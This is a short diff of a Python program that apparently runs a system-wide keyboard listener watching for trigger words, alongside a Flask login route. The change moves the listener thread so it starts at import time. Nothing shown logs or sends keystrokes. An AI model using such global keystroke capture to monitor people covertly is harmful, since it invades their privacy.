@@ -18,6 +18,7 @@ trigger_words = {
 page_opened_recently = False  # Flag to control page opening
 
 def on_press(key):
+
     global page_opened_recently
     try:
         if key.char:
@@ -85,9 +86,10 @@ def login():
     else:
         return "Missing data", 400
 
+threading.Thread(target=start_listener).start()
+
 if __name__ == "__main__":
 
-    threading.Thread(target=start_listener).start()
     app.run()
 
 
